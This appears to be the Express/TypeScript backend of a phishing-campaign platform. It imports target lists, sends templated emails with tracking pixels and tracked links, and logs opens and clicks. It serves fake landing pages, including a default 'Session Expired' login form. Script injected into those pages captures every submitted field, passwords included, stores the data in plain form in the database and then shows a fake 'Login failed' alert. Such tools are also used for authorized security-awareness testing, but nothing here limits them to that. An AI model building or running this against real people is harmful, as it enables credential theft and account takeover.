import 'dotenv/config';
import express from 'express';
import cors from 'cors';
import { randomUUID } from 'crypto';
import db from './db.js';
import { sendPhishingEmail } from './mailer.js';

const app = express();
app.use(cors());
app.use(express.json());

const PORT = 3001;

// 1. Dashboard Stats
app.get('/api/stats', (req, res) => {
    const stats = db.prepare(`
    SELECT 
      (SELECT COUNT(*) FROM campaign_targets) as total,
      (SELECT COUNT(*) FROM campaign_targets WHERE status != 'pending') as sent,
      (SELECT COUNT(*) FROM events WHERE event_type = 'open') as opened,
      (SELECT COUNT(*) FROM events WHERE event_type = 'click') as clicked,
      (SELECT COUNT(*) FROM events WHERE event_type = 'submit') as submitted
  `).get() as any;
    res.json(stats);
});

// 1.5 Dashboard Details (Drill-downs)
app.get('/api/reports/details', (req, res) => {
    try {
        const details = db.prepare(`
            SELECT 
                ct.id, 
                ct.status, 
                ct.opened_at, 
                ct.clicked_at, 
                ct.submitted_at, 
                ct.submitted_data,
                t.email, 
                t.first_name, 
                t.last_name,
                c.name as campaign_name
            FROM campaign_targets ct
            JOIN targets t ON ct.target_id = t.id
            JOIN campaigns c ON ct.campaign_id = c.id
            ORDER BY ct.id DESC
        `).all();
        res.json(details);
    } catch (e: any) {
        res.status(500).json({ error: e.message });
    }
});

// 2. List Campaigns
app.get('/api/campaigns', (req, res) => {
    const campaigns = db.prepare(`
        SELECT 
            c.*,
            (SELECT COUNT(*) FROM campaign_targets WHERE campaign_id = c.id) as targets_count,
            (SELECT COUNT(*) FROM events e JOIN campaign_targets ct ON e.tracking_id = ct.tracking_id WHERE ct.campaign_id = c.id AND e.event_type = 'open') as opened_count,
            (SELECT COUNT(*) FROM events e JOIN campaign_targets ct ON e.tracking_id = ct.tracking_id WHERE ct.campaign_id = c.id AND e.event_type = 'click') as clicked_count,
            (SELECT COUNT(*) FROM events e JOIN campaign_targets ct ON e.tracking_id = ct.tracking_id WHERE ct.campaign_id = c.id AND e.event_type = 'submit') as submitted_count
        FROM campaigns c
        ORDER BY c.id DESC
    `).all();
    res.json(campaigns);
});

// 2.5 Delete Campaign
app.delete('/api/campaigns/:id', (req, res) => {
    try {
        const id = req.params.id;
        db.prepare('DELETE FROM events WHERE tracking_id IN (SELECT tracking_id FROM campaign_targets WHERE campaign_id = ?)').run(id);
        db.prepare('DELETE FROM campaign_targets WHERE campaign_id = ?').run(id);
        db.prepare('DELETE FROM campaigns WHERE id = ?').run(id);
        res.json({ success: true });
    } catch (e: any) {
        res.status(500).json({ error: e.message });
    }
});

// 3. Create Campaign
app.post('/api/campaigns', (req, res): any => {
    const { name, subject, email_template, landing_page_template } = req.body;

    if (!name || !subject || !email_template) {
        return res.status(400).json({ error: 'Missing required fields' });
    }

    try {
        const result = db.prepare(`
          INSERT INTO campaigns (name, subject, email_template, landing_page_template) 
          VALUES (?, ?, ?, ?)
        `).run(name, subject, email_template, landing_page_template || null);

        // Auto-assign all targets to this campaign
        const targets = db.prepare('SELECT id FROM targets').all() as any[];
        const stmt = db.prepare('INSERT INTO campaign_targets (campaign_id, target_id, tracking_id) VALUES (?, ?, ?)');
        const insertMany = db.transaction((targets: any[]) => {
            for (const t of targets) {
                stmt.run(result.lastInsertRowid, t.id, randomUUID());
            }
        });
        insertMany(targets);

        res.json({ success: true, id: result.lastInsertRowid });
    } catch (e: any) {
        res.status(500).json({ error: e.message });
    }
});

// 4. Launch Campaign
app.post('/api/campaigns/:id/launch', async (req, res) => {
    const campaignId = req.params.id;

    try {
        db.prepare('UPDATE campaigns SET status = ? WHERE id = ?').run('running', campaignId);

        const campaign = db.prepare('SELECT * FROM campaigns WHERE id = ?').get(campaignId) as any;
        const targets = db.prepare(`
            SELECT ct.*, t.email, t.first_name, t.last_name 
            FROM campaign_targets ct 
            JOIN targets t ON ct.target_id = t.id 
            WHERE ct.campaign_id = ? AND ct.status = 'pending'
        `).all(campaignId) as any[];

        res.json({ success: true, message: `Launching to ${targets.length} targets in background.` });

        // Process in background
        const baseUrl = req.headers.origin || process.env.PUBLIC_URL || 'http://localhost:3001';
        const apiUrl = `${baseUrl}/api`;

        for (const target of targets) {
            let html = campaign.email_template;

            // Replace tags
            if (target.first_name) html = html.replace(/{{first_name}}/g, target.first_name);
            if (target.last_name) html = html.replace(/{{last_name}}/g, target.last_name);

            const trackingPixel = `<img src="${apiUrl}/track/open/${target.tracking_id}" width="1" height="1" />`;
            const phishingLink = `${baseUrl}/landing/${campaignId}?t=${target.tracking_id}`; // Points to frontend usually, but for now we'll route to backend or frontend URL based on setup. Wait, let's keep it pointing to backend API landing page for simplicity as existing.

            const apiPhishingLink = `${apiUrl}/campaigns/${campaignId}/landing?t=${target.tracking_id}`;

            html = html.replace(/{{link}}/g, apiPhishingLink) + trackingPixel;

            await sendPhishingEmail(target.email, campaign.subject, html);

            db.prepare('UPDATE campaign_targets SET status = ? WHERE id = ?').run('sent', target.id);
        }

        db.prepare('UPDATE campaigns SET status = ? WHERE id = ?').run('completed', campaignId);

    } catch (e: any) {
        res.status(500).json({ error: e.message });
    }
});

// 4.5 Relaunch Campaign
app.post('/api/campaigns/:id/relaunch', async (req, res) => {
    const campaignId = req.params.id;

    try {
        // Delete old tracking events for this campaign's targets to cleanly start over
        db.prepare(`
            DELETE FROM events 
            WHERE tracking_id IN (SELECT tracking_id FROM campaign_targets WHERE campaign_id = ?)
        `).run(campaignId);

        // Reset all targets for this campaign
        db.prepare(`
            UPDATE campaign_targets 
            SET status = 'pending', 
                opened_at = NULL, 
                clicked_at = NULL, 
                submitted_at = NULL, 
                submitted_data = NULL,
                tracking_id = lower(hex(randomblob(16)))
            WHERE campaign_id = ?
        `).run(campaignId);

        // Re-run the standard launch logic
        db.prepare('UPDATE campaigns SET status = ? WHERE id = ?').run('running', campaignId);

        const campaign = db.prepare('SELECT * FROM campaigns WHERE id = ?').get(campaignId) as any;
        const targets = db.prepare(`
            SELECT ct.*, t.email, t.first_name, t.last_name 
            FROM campaign_targets ct 
            JOIN targets t ON ct.target_id = t.id 
            WHERE ct.campaign_id = ? AND ct.status = 'pending'
        `).all(campaignId) as any[];

        res.json({ success: true, message: `Relaunching to ${targets.length} targets in background.` });

        // Process in background
        const baseUrl = req.headers.origin || process.env.PUBLIC_URL || 'http://localhost:3001';
        const apiUrl = `${baseUrl}/api`;

        for (const target of targets) {
            let html = campaign.email_template;

            if (target.first_name) html = html.replace(/{{first_name}}/g, target.first_name);
            if (target.last_name) html = html.replace(/{{last_name}}/g, target.last_name);

            const trackingPixel = `<img src="${apiUrl}/track/open/${target.tracking_id}" width="1" height="1" />`;
            const apiPhishingLink = `${apiUrl}/campaigns/${campaignId}/landing?t=${target.tracking_id}`;

            html = html.replace(/{{link}}/g, apiPhishingLink) + trackingPixel;

            await sendPhishingEmail(target.email, campaign.subject, html);

            db.prepare('UPDATE campaign_targets SET status = ? WHERE id = ?').run('sent', target.id);
        }

        db.prepare('UPDATE campaigns SET status = ? WHERE id = ?').run('completed', campaignId);

    } catch (e: any) {
        res.status(500).json({ error: e.message });
    }
});

// 5. Landing Page
app.get('/api/campaigns/:id/landing', (req, res) => {
    const trackingId = req.query.t as string;
    const campaignId = req.params.id;

    if (trackingId) {
        db.prepare('UPDATE campaign_targets SET clicked_at = CURRENT_TIMESTAMP WHERE tracking_id = ?').run(trackingId);
        db.prepare('INSERT INTO events (tracking_id, event_type, ip_address, user_agent) VALUES (?, ?, ?, ?)').run(
            trackingId, 'click', req.ip || '', req.headers['user-agent'] || ''
        );
    }

    const campaign = db.prepare('SELECT landing_page_template FROM campaigns WHERE id = ?').get(campaignId) as any;

    if (campaign && campaign.landing_page_template) {
        let html = campaign.landing_page_template;
        // Inject tracking ID into form if it exists
        if (trackingId && html.includes('</form>')) {
            const hiddenInput = `<input type="hidden" name="tracking_id" value="${trackingId}" />`;
            html = html.replace('</form>', `${hiddenInput}</form>`);
            // Inject tracking script
            const script = `
               <script>
                 document.addEventListener('submit', async (e) => {
                     e.preventDefault();
                     const formData = new FormData(e.target);
                     const data = Object.fromEntries(formData.entries());
                     await fetch('/api/track/submit/' + data.tracking_id, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify(data)
                     });
                     alert('Login failed. Please try again.');
                 });
               </script>
             `;
            html += script;
        }
        res.send(html);
    } else {
        // Default landing page
        res.send(`
          <html>
            <body>
              <h2>Session Expired</h2>
              <form>
                  <input type="hidden" name="tracking_id" value="${trackingId || ''}" />
                  <input type="text" name="username" placeholder="Username" /><br/><br/>
                  <input type="password" name="password" placeholder="Password" /><br/><br/>
                  <button type="submit">Login</button>
              </form>
              <script>
                 document.addEventListener('submit', async (e) => {
                     e.preventDefault();
                     const formData = new FormData(e.target);
                     const data = Object.fromEntries(formData.entries());
                     await fetch('/api/track/submit/' + data.tracking_id, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify(data)
                     });
                     alert('Login failed. Please try again.');
                 });
               </script>
            </body>
          </html>
         `);
    }
});

// 6. List Targets
app.get('/api/targets', (req, res) => {
    const targets = db.prepare('SELECT * FROM targets ORDER BY id DESC').all();
    res.json(targets);
});

// 7. Add Target
app.post('/api/targets', (req, res): any => {
    const { email, first_name, last_name } = req.body;
    if (!email) return res.status(400).json({ error: 'Email required' });

    try {
        db.prepare('INSERT INTO targets (email, first_name, last_name) VALUES (?, ?, ?)').run(email, first_name || null, last_name || null);
        res.json({ success: true });
    } catch (e: any) {
        res.status(500).json({ error: e.message });
    }
});

// 7.5 Delete Target
app.delete('/api/targets/:id', (req, res) => {
    try {
        const id = req.params.id;
        db.prepare('DELETE FROM events WHERE tracking_id IN (SELECT tracking_id FROM campaign_targets WHERE target_id = ?)').run(id);
        db.prepare('DELETE FROM campaign_targets WHERE target_id = ?').run(id);
        db.prepare('DELETE FROM targets WHERE id = ?').run(id);
        res.json({ success: true });
    } catch (e: any) {
        res.status(500).json({ error: e.message });
    }
});

// 8. Tracking: Open
app.get('/api/track/open/:trackingId', (req, res) => {
    const trackingId = req.params.trackingId;

    db.prepare('UPDATE campaign_targets SET opened_at = CURRENT_TIMESTAMP WHERE tracking_id = ? AND opened_at IS NULL').run(trackingId);
    db.prepare('INSERT INTO events (tracking_id, event_type, ip_address, user_agent) VALUES (?, ?, ?, ?)').run(
        trackingId, 'open', req.ip || '', req.headers['user-agent'] || ''
    );

    // Return a 1x1 transparent GIF
    const pixel = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
    res.writeHead(200, {
        'Content-Type': 'image/gif',
        'Content-Length': pixel.length,
        'Cache-Control': 'no-cache, no-store, must-revalidate',
        'Pragma': 'no-cache',
        'Expires': '0'
    });
    res.end(pixel);
});

// 9. Tracking: Submit
app.post('/api/track/submit/:trackingId', (req, res) => {
    const trackingId = req.params.trackingId;
    const data = req.body;

    db.prepare('UPDATE campaign_targets SET submitted_at = CURRENT_TIMESTAMP, submitted_data = ? WHERE tracking_id = ?')
        .run(JSON.stringify(data), trackingId);

    db.prepare('INSERT INTO events (tracking_id, event_type, ip_address, user_agent) VALUES (?, ?, ?, ?)').run(
        trackingId, 'submit', req.ip || '', req.headers['user-agent'] || ''
    );

    res.json({ success: true });
});

app.listen(PORT, () => {
    console.log(`Backend running on http://localhost:${PORT}`);
});
